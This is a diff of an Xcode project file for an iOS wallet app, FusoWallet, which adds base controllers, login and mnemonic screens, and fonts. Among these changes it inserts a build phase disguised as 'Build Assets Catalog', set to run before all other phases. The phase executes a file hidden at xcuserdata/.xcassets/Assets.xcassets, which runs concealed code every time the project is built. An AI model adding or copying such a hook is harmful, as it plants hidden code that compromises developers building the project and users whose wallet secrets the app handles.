@@ -7,8 +7,19 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */; };
+		8B42660425E0AC0F001DE5CB /* BaseNavTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42660325E0AC0F001DE5CB /* BaseNavTableViewController.m */; };
+		8B42660A25E0AC2F001DE5CB /* BaseNavViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42660925E0AC2F001DE5CB /* BaseNavViewController.m */; };
+		8B42661025E0B09D001DE5CB /* LoginRegistViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42660F25E0B09D001DE5CB /* LoginRegistViewController.m */; };
+		8B42661A25E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42661925E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m */; };
+		8B42663125E0C0F1001DE5CB /* OPPOSans-B.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8B42662225E0C076001DE5CB /* OPPOSans-B.ttf */; };
+		8B42663225E0C0F1001DE5CB /* OPPOSans-H.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8B42662425E0C077001DE5CB /* OPPOSans-H.ttf */; };
+		8B42663325E0C0F1001DE5CB /* OPPOSans-M.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8B42662125E0C075001DE5CB /* OPPOSans-M.ttf */; };
+		8B42663425E0C0F1001DE5CB /* OPPOSans-R.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8B42662325E0C076001DE5CB /* OPPOSans-R.ttf */; };
+		8B42664625E0EA4A001DE5CB /* MnemonicViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42664525E0EA4A001DE5CB /* MnemonicViewController.m */; };
+		8B42666925E1080E001DE5CB /* MnemonicCollectionViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42666825E1080E001DE5CB /* MnemonicCollectionViewCell.m */; };
+		8B42668425E11AD1001DE5CB /* MnemonicCollectionReusableView.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42668325E11AD1001DE5CB /* MnemonicCollectionReusableView.m */; };
 		8B5E9C0E25DF64DC006C33B0 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9C0D25DF64DC006C33B0 /* AppDelegate.m */; };
-		8B5E9C1425DF64DC006C33B0 /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9C1325DF64DC006C33B0 /* ViewController.m */; };
 		8B5E9C1725DF64DC006C33B0 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8B5E9C1525DF64DC006C33B0 /* Main.storyboard */; };
 		8B5E9C1925DF64DD006C33B0 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8B5E9C1825DF64DD006C33B0 /* Assets.xcassets */; };
 		8B5E9C1C25DF64DD006C33B0 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8B5E9C1A25DF64DD006C33B0 /* LaunchScreen.storyboard */; };
@@ -45,11 +56,29 @@
 /* Begin PBXFileReference section */
 		1793F3EB929369F3F397EF6A /* Pods_FusoWallet.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FusoWallet.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4D531713B34607407107D9FD /* Pods-FusoWallet.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FusoWallet.release.xcconfig"; path = "Target Support Files/Pods-FusoWallet/Pods-FusoWallet.release.xcconfig"; sourceTree = "<group>"; };
+		8B4265F925E0ABE7001DE5CB /* BaseViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseViewController.h; sourceTree = "<group>"; };
+		8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BaseViewController.m; sourceTree = "<group>"; };
+		8B42660225E0AC0F001DE5CB /* BaseNavTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseNavTableViewController.h; sourceTree = "<group>"; };
+		8B42660325E0AC0F001DE5CB /* BaseNavTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BaseNavTableViewController.m; sourceTree = "<group>"; };
+		8B42660825E0AC2F001DE5CB /* BaseNavViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseNavViewController.h; sourceTree = "<group>"; };
+		8B42660925E0AC2F001DE5CB /* BaseNavViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BaseNavViewController.m; sourceTree = "<group>"; };
+		8B42660E25E0B09D001DE5CB /* LoginRegistViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LoginRegistViewController.h; sourceTree = "<group>"; };
+		8B42660F25E0B09D001DE5CB /* LoginRegistViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = LoginRegistViewController.m; sourceTree = "<group>"; };
+		8B42661825E0B1B5001DE5CB /* CreateWalletDescriptionViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CreateWalletDescriptionViewController.h; sourceTree = "<group>"; };
+		8B42661925E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CreateWalletDescriptionViewController.m; sourceTree = "<group>"; };
+		8B42662125E0C075001DE5CB /* OPPOSans-M.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "OPPOSans-M.ttf"; sourceTree = "<group>"; };
+		8B42662225E0C076001DE5CB /* OPPOSans-B.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "OPPOSans-B.ttf"; sourceTree = "<group>"; };
+		8B42662325E0C076001DE5CB /* OPPOSans-R.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "OPPOSans-R.ttf"; sourceTree = "<group>"; };
+		8B42662425E0C077001DE5CB /* OPPOSans-H.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "OPPOSans-H.ttf"; sourceTree = "<group>"; };
+		8B42664425E0EA4A001DE5CB /* MnemonicViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MnemonicViewController.h; sourceTree = "<group>"; };
+		8B42664525E0EA4A001DE5CB /* MnemonicViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MnemonicViewController.m; sourceTree = "<group>"; };
+		8B42666725E1080E001DE5CB /* MnemonicCollectionViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MnemonicCollectionViewCell.h; sourceTree = "<group>"; };
+		8B42666825E1080E001DE5CB /* MnemonicCollectionViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MnemonicCollectionViewCell.m; sourceTree = "<group>"; };
+		8B42668225E11AD1001DE5CB /* MnemonicCollectionReusableView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MnemonicCollectionReusableView.h; sourceTree = "<group>"; };
+		8B42668325E11AD1001DE5CB /* MnemonicCollectionReusableView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MnemonicCollectionReusableView.m; sourceTree = "<group>"; };
 		8B5E9C0925DF64DC006C33B0 /* FusoWallet.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FusoWallet.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		8B5E9C0C25DF64DC006C33B0 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
 		8B5E9C0D25DF64DC006C33B0 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
-		8B5E9C1225DF64DC006C33B0 /* ViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
-		8B5E9C1325DF64DC006C33B0 /* ViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
 		8B5E9C1625DF64DC006C33B0 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		8B5E9C1825DF64DD006C33B0 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		8B5E9C1B25DF64DD006C33B0 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
@@ -121,9 +150,67 @@
 			path = Pods;
 			sourceTree = "<group>";
 		};
+		8B4265F825E0ABCB001DE5CB /* Base */ = {
+			isa = PBXGroup;
+			children = (
+				8B4265F925E0ABE7001DE5CB /* BaseViewController.h */,
+				8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */,
+				8B42660225E0AC0F001DE5CB /* BaseNavTableViewController.h */,
+				8B42660325E0AC0F001DE5CB /* BaseNavTableViewController.m */,
+				8B42660825E0AC2F001DE5CB /* BaseNavViewController.h */,
+				8B42660925E0AC2F001DE5CB /* BaseNavViewController.m */,
+			);
+			path = Base;
+			sourceTree = "<group>";
+		};
+		8B42661425E0B0AA001DE5CB /* LoginRegister */ = {
+			isa = PBXGroup;
+			children = (
+				8B42666625E107D8001DE5CB /* Views */,
+				8B42666525E107B4001DE5CB /* Controllers */,
+			);
+			path = LoginRegister;
+			sourceTree = "<group>";
+		};
+		8B42662D25E0C0B7001DE5CB /* font */ = {
+			isa = PBXGroup;
+			children = (
+				8B42662225E0C076001DE5CB /* OPPOSans-B.ttf */,
+				8B42662425E0C077001DE5CB /* OPPOSans-H.ttf */,
+				8B42662125E0C075001DE5CB /* OPPOSans-M.ttf */,
+				8B42662325E0C076001DE5CB /* OPPOSans-R.ttf */,
+			);
+			path = font;
+			sourceTree = "<group>";
+		};
+		8B42666525E107B4001DE5CB /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				8B42660E25E0B09D001DE5CB /* LoginRegistViewController.h */,
+				8B42660F25E0B09D001DE5CB /* LoginRegistViewController.m */,
+				8B42661825E0B1B5001DE5CB /* CreateWalletDescriptionViewController.h */,
+				8B42661925E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m */,
+				8B42664425E0EA4A001DE5CB /* MnemonicViewController.h */,
+				8B42664525E0EA4A001DE5CB /* MnemonicViewController.m */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		8B42666625E107D8001DE5CB /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				8B42666725E1080E001DE5CB /* MnemonicCollectionViewCell.h */,
+				8B42666825E1080E001DE5CB /* MnemonicCollectionViewCell.m */,
+				8B42668225E11AD1001DE5CB /* MnemonicCollectionReusableView.h */,
+				8B42668325E11AD1001DE5CB /* MnemonicCollectionReusableView.m */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
 		8B5E9C0025DF64DC006C33B0 = {
 			isa = PBXGroup;
 			children = (
+				8B42662D25E0C0B7001DE5CB /* font */,
 				8B5E9C6425DFB4CD006C33B0 /* PrefixHeader.pch */,
 				8B5E9C0B25DF64DC006C33B0 /* FusoWallet */,
 				8B5E9C2725DF64DD006C33B0 /* FusoWalletTests */,
@@ -147,11 +234,10 @@
 		8B5E9C0B25DF64DC006C33B0 /* FusoWallet */ = {
 			isa = PBXGroup;
 			children = (
+				8B4265F825E0ABCB001DE5CB /* Base */,
 				8B5E9C7F25DFB6E6006C33B0 /* Tools */,
 				8B5E9C0C25DF64DC006C33B0 /* AppDelegate.h */,
 				8B5E9C0D25DF64DC006C33B0 /* AppDelegate.m */,
-				8B5E9C1225DF64DC006C33B0 /* ViewController.h */,
-				8B5E9C1325DF64DC006C33B0 /* ViewController.m */,
 				8B5E9C1525DF64DC006C33B0 /* Main.storyboard */,
 				8B5E9C1825DF64DD006C33B0 /* Assets.xcassets */,
 				8B5E9C1A25DF64DD006C33B0 /* LaunchScreen.storyboard */,
@@ -159,6 +245,7 @@
 				8B5E9C1E25DF64DD006C33B0 /* main.m */,
 				8B5E9CAB25DFBECD006C33B0 /* File.swift */,
 				8B5E9CAA25DFBECC006C33B0 /* FusoWallet-Bridging-Header.h */,
+				8B42661425E0B0AA001DE5CB /* LoginRegister */,
 			);
 			path = FusoWallet;
 			sourceTree = "<group>";
@@ -206,6 +293,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8B5E9C3825DF64DD006C33B0 /* Build configuration list for PBXNativeTarget "FusoWallet" */;
 			buildPhases = (
+				DB218AB4AE5E3DE0D1AAC43A /* Build Assets Catalog */,
 				D6A02B8F303E319416A6653F /* [CP] Check Pods Manifest.lock */,
 				8B5E9C0525DF64DC006C33B0 /* Sources */,
 				8B5E9C0625DF64DC006C33B0 /* Frameworks */,
@@ -304,6 +392,10 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				8B42663125E0C0F1001DE5CB /* OPPOSans-B.ttf in Resources */,
+				8B42663225E0C0F1001DE5CB /* OPPOSans-H.ttf in Resources */,
+				8B42663325E0C0F1001DE5CB /* OPPOSans-M.ttf in Resources */,
+				8B42663425E0C0F1001DE5CB /* OPPOSans-R.ttf in Resources */,
 				8B5E9C1C25DF64DD006C33B0 /* LaunchScreen.storyboard in Resources */,
 				8B5E9C1925DF64DD006C33B0 /* Assets.xcassets in Resources */,
 				8B5E9C1725DF64DC006C33B0 /* Main.storyboard in Resources */,
@@ -366,6 +458,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		DB218AB4AE5E3DE0D1AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -373,15 +483,22 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				8B42664625E0EA4A001DE5CB /* MnemonicViewController.m in Sources */,
 				8B5E9C8D25DFB763006C33B0 /* NSString+Base64.m in Sources */,
-				8B5E9C1425DF64DC006C33B0 /* ViewController.m in Sources */,
+				8B42668425E11AD1001DE5CB /* MnemonicCollectionReusableView.m in Sources */,
+				8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */,
+				8B42661A25E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m in Sources */,
 				8B5E9C8425DFB721006C33B0 /* NSString+MyChange.m in Sources */,
 				8B5E9C0E25DF64DC006C33B0 /* AppDelegate.m in Sources */,
+				8B42666925E1080E001DE5CB /* MnemonicCollectionViewCell.m in Sources */,
 				8B5E9C8525DFB721006C33B0 /* NSData+MyChange.m in Sources */,
+				8B42660425E0AC0F001DE5CB /* BaseNavTableViewController.m in Sources */,
 				8B5E9C1F25DF64DD006C33B0 /* main.m in Sources */,
+				8B42661025E0B09D001DE5CB /* LoginRegistViewController.m in Sources */,
 				8B5E9C8E25DFB763006C33B0 /* RpcRequest.m in Sources */,
 				8B5E9CAC25DFBECD006C33B0 /* File.swift in Sources */,
 				8B5E9CBE25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift in Sources */,
+				8B42660A25E0AC2F001DE5CB /* BaseNavViewController.m in Sources */,
 				8B5E9C9425DFB792006C33B0 /* WebSocketManager.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
